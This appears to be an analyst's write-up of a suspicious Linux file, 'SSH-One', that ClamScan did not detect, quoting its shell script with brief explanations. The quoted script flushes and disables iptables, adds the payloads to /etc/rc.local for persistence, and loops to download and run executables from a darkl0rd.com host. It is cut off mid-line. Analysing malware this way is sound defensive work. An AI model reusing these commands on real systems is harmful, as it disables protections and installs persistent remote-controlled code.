One of the files in /home/ubuntu/Downloads/ looks suspicious as well but it wasnâ€™t detected by Clamscan. The file is SSH-One. 

1. The script seems to work to disable iptables and check the if service is disabled: 

==============================================
iptables -F
/etc/init.d/iptables stop
chkconfig iptables off
==============================================


2. Afterwards, it changes the values in the /tmp/SSH-T and /tmp/SSH-One files to the rc.local superuser startup script.  

==============================================
echo "chmod +x /tmp/SSH-T" >> /etc/rc.local
echo "/tmp/SSH-T" >>  /etc/rc.local
echo "chmod +x /tmp/SSH-One" >> /etc/rc.local
echo "/tmp/SSH-One" >>  /etc/rc.local
==============================================

3. The scrip fetches data from some links and loops over both SSH-T and SSH-One to change permissions to execute the files: 
 
==============================================
m=SSH-T
script=SSH-One
hfs_m=http://darkl0rd.com:7758/SSH-T
hfs_s=http://darkl0rd.com:7758/SSH-One
rm -f /tmp/$m*
while true

do
    ps aux | grep $m | grep -v grep
    if [ $? -eq 0 ];then
         sleep 10
    else
                ls -l /tmp/$m
                        if [ $? -eq 0 ];then
                         /tmp/$m
                        else
    cd /tmp/;wget $hfs_m ; chmod a+x $m;/tmp/$m
        fi
   fi
    ps aux | grep $script | grep -v grep
    if [ $? -eq 0 ];then
         sleep 10
    else
        ls -l /tmp/$script
        if [ $? -eq 0];then
==============================================
